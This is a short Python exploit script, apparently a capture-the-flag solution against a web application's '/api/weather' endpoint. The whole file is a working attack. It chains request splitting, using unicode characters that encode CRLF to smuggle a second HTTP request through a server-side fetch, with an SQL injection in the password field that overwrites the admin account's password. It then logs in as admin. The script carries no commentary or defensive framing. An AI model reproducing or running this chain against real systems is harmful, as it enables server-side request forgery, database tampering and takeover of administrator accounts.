import requests


targeturl=" \\box-url "

username="admin"
password="125') on conflict(username) DO UPDATE SET password = 'admin';"
parseuser=username.replace(" ","\u0120").replace("'","%27").replace('"','%22')
parsepass=password.replace(" ","\u0120").replace("'","%27").replace('"','%22')
ContentLength = len(parsepass) + len(parseuser) + 19


endpoint = "127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120"+ str(ContentLength) +"\u010D\u010A\u010D\u010Ausername="+ parseuser +"&password="+ parsepass +'\u010D\u010A\u010D\u010AGET\u0120/'



json = {
	"endpoint":endpoint,
	"city":"lol",
	"country":"lol"
	}

print('starting ----------------------------------------------------------------------------------')
r = requests.post(url=targeturl+"/api/weather",json=json)
data = {"username":"admin","password":"admin"}
r2 = requests.post(targeturl+'/login',data=data)
print(r2.text)

			